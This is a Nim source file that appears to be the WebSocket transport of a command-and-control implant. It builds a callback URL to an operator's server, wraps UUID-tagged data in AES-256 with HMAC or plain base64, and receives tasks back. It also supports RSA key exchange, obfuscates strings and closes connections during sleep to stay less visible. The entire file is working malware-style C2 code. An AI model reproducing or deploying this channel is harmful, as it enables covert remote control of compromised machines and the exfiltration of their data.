import std/[base64, strutils, json, asyncdispatch, os]
import ws
import ../config
import ../utils/crypto
import ../utils/debug
import ../utils/strenc

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/key_exchange

when defined(windows):
  import winim/lean

type
  WebSocketProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]  # Separate key for decryption
    ws: WebSocket
    connected: bool
    url: string

  WebSocketMessage = object
    data: string

proc buildWebSocketUrl(profile: WebSocketProfile): string =
  ## Build the full WebSocket URL
  var host = profile.config.callbackHost
  let port = profile.config.callbackPort
  # WebSocket uses ENDPOINT_REPLACE instead of POST_URI
  let endpoint = profile.config.endpointReplace
  if endpoint.len == 0:
    raise newException(ValueError, obf("ENDPOINT_REPLACE environment variable is not set"))
  
  # Strip any existing scheme from host
  if host.startsWith("wss://") or host.startsWith("ws://"):
    let protocolEnd = if host.startsWith("wss://") : 6 else: 5
    host = host[protocolEnd..^1]
  elif host.startsWith("https://"):
    host = host[8..^1]
  elif host.startsWith("http://"):
    host = host[7..^1]
  
  # Determine protocol based on port
  let protocol = if port == "443": "wss" else: "ws"
  
  # Build URL
  result = protocol & "://" & host & ":" & port & "/" & endpoint.strip(chars = {'/'})

proc ensureConnection(profile: var WebSocketProfile): bool =
  ## Ensure WebSocket connection is established using blocking waitFor()
  if profile.connected and not profile.ws.isNil:
    return true
  
  try:
    debugLog "websocket", "Connecting to WebSocket: ", profile.url
    # Note: ws library doesn't support custom headers in simple newWebSocket()
    # Would require using Request object for custom headers
    debugLog "websocket", "WebSocket User-Agent: ", profile.config.userAgent, " (not configurable with ws library)"
    # Use waitFor() to block on async connection
    profile.ws = waitFor(newWebSocket(profile.url))
    profile.connected = true
    debugLog "websocket", "WebSocket connected successfully"
    return true
  except:
    debugLog "websocket", "WebSocket connection failed: ", getCurrentExceptionMsg()
    profile.connected = false
    return false

proc newWebSocketProfile*(): WebSocketProfile =
  ## Create a new WebSocket profile
  result = WebSocketProfile()
  result.config = getConfig()
  result.connected = false
  result.url = result.buildWebSocketUrl()

proc send*(profile: var WebSocketProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server via WebSocket using blocking waitFor()
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  debugLog "websocket", "=== SENDING DATA VIA WEBSOCKET ==="
  # Try to pretty-print JSON if it's valid JSON and small enough
  try:
    let jsonData = parseJson(data)
    # Only show full JSON for small payloads (< 2KB)
    if data.len < 2048:
      debugLog "websocket", "Request JSON:"
      debug jsonData.pretty()
    else:
      # For large payloads, show summary
      debugLog "websocket", "Request: Large payload (", data.len, " bytes)"
      if jsonData.hasKey(obf("action")):
        debugLog "websocket", "Action: ", jsonData["action"].getStr()
      if jsonData.hasKey(obf("responses")):
        debugLog "websocket", "Responses count: ", jsonData["responses"].len
  except:
    # Not JSON or parse error, show raw
    debugLog "websocket", "Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Ensure connection
  if not profile.ensureConnection():
    debugLog "websocket", "Failed to establish WebSocket connection"
    return ""
  
  try:
    # Only encrypt if AES key is available AND we have a callback UUID
    var payload: string
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      debugLog "websocket", "Encrypting payload with AES-256-CBC+HMAC"
      debugLog "websocket", "Data length: ", data.len, " bytes"
      debugLog "websocket", "AES key length: ", profile.aesKey.len, " bytes"
      debugLog "websocket", "UUID: ", uuid
      payload = encryptPayload(data, profile.aesKey, uuid)
      debugLog "websocket", "Encrypted payload length: ", payload.len, " bytes"
    else:
      # No encryption, just base64(UUID + data)
      debugLog "websocket", "Sending unencrypted payload (Base64 only)"
      debugLog "websocket", "Data length: ", data.len, " bytes"
      debugLog "websocket", "UUID: ", uuid
      payload = encode(uuid & data)
      debugLog "websocket", "Encoded payload length: ", payload.len, " bytes"
    # Create WebSocket message JSON
    let wsMsg = WebSocketMessage(data: payload)
    let jsonStr = $(%*wsMsg)
    debugLog "websocket", "Sending WebSocket frame to: ", profile.url
    debugLog "websocket", "Frame JSON length: ", jsonStr.len, " bytes"
    if jsonStr.len < 500:
      debugLog "websocket", "Full frame JSON: ", jsonStr
    else:
      debugLog "websocket", "Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
    # Send using blocking waitFor()
    debugLog "websocket", "Sending WebSocket message..."
    waitFor(profile.ws.send(jsonStr))
    debugLog "websocket", "Waiting for response..."
    # Receive response using blocking waitFor()
    let frameData = waitFor(profile.ws.receiveStrPacket())
    debugLog "websocket", "WebSocket response received"
    debugLog "websocket", "Frame data length: ", frameData.len, " bytes"
    debugLog "websocket", "Raw frame data: ", frameData
    # Parse JSON response wrapper
    try:
      let frameJson = parseJson(frameData)
      if frameJson.hasKey(obf("data")):
        let respData = frameJson[obf("data")].getStr()
        debugLog "websocket", "Response data length: ", respData.len, " bytes"
        if respData.len > 0:
          debugLog "websocket", "Response preview (first 100 chars): ", respData[0..<min(100, respData.len)]
        else:
          debugLog "websocket", "Response data is EMPTY!"
        # Decrypt response if AES key is available and we have callback UUID
        if profile.aesKey.len > 0 and callbackUuid.len > 0:
          debugLog "websocket", "Decrypting response with AES-256-CBC+HMAC"
          result = decryptPayload(respData, profile.aesKey)
          debugLog "websocket", "Decrypted response length: ", result.len, " bytes"
        else:
          # No encryption, decode and skip UUID
          debugLog "websocket", "Decoding unencrypted response (Base64)"
          let decoded = decode(respData)
          if decoded.len > 36:
            result = decoded[36..^1]
          else:
            result = ""
        # Try to parse and pretty-print response JSON
        if result.len > 0:
          debugLog "websocket", "=== RECEIVED RESPONSE ==="
          try:
            let jsonResp = parseJson(result)
            # Only show full JSON for small responses (< 2KB)
            if result.len < 2048:
              debugLog "websocket", "Response JSON:"
              debug jsonResp.pretty()
            else:
              # For large responses, show summary
              debugLog "websocket", "Response: Large payload (", result.len, " bytes)"
              if jsonResp.hasKey(obf("action")):
                debugLog "websocket", "Action: ", jsonResp["action"].getStr()
              if jsonResp.hasKey(obf("responses")):
                debugLog "websocket", "Responses count: ", jsonResp["responses"].len
              if jsonResp.hasKey(obf("tasks")):
                debugLog "websocket", "Tasks count: ", jsonResp["tasks"].len
          except:
            debugLog "websocket", "Response data (first 500 chars): ", result[0..<min(500, result.len)]
        return result
      else:
        debugLog "websocket", "No 'data' field in response JSON"
        return ""
    except:
      debugLog "websocket", "Failed to parse response JSON: ", getCurrentExceptionMsg()
      return ""
  except:
    debugLog "websocket", "WebSocket request failed: ", getCurrentExceptionMsg()
    profile.connected = false
    try:
      profile.ws.close()
    except:
      discard
    return ""

proc close*(profile: var WebSocketProfile) =
  ## Close WebSocket connection
  if profile.connected and not profile.ws.isNil:
    try:
      profile.ws.close()
    except:
      discard
    profile.connected = false

proc cleanup*(profile: var WebSocketProfile) =
  ## Close WebSocket connection to avoid keeping ESTABLISHED connections during sleep
  debugLog "websocket", "WebSocket Profile: Cleaning up connection"
  profile.close()
  debugLog "websocket", "WebSocket Profile: Connection closed"

proc reconnect*(profile: var WebSocketProfile) =
  ## Recreate WebSocket connection after cleanup
  debugLog "websocket", "WebSocket Profile: Reconnecting"
  discard profile.ensureConnection()
  debugLog "websocket", "WebSocket Profile: Reconnection complete"

proc setAesKey*(profile: var WebSocketProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key
proc setAesDecKey*(profile: var WebsocketProfile, key: seq[byte]) =
  ## Set the AES decryption key
  profile.aesDecKey = key
proc hasAesKey*(profile: WebSocketProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var WebSocketProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    debugLog "websocket", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    # Don't set key yet - will be set after successful checkin
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    debugLog "websocket", "RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Use shared key exchange implementation
  else:
    # Create a send wrapper that matches the expected signature
    var p = profile  # Create capturable local reference
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
      # Set the AES key
      profile.setAesKey(exchangeResult.sessionKey)
      return (true, exchangeResult.newUuid)
    elif exchangeResult.success:
      # No key exchange needed (AESPSK mode)
      return (true, "")
    else:
      debugLog "websocket", "Key exchange failed: ", exchangeResult.error
      return (false, "")
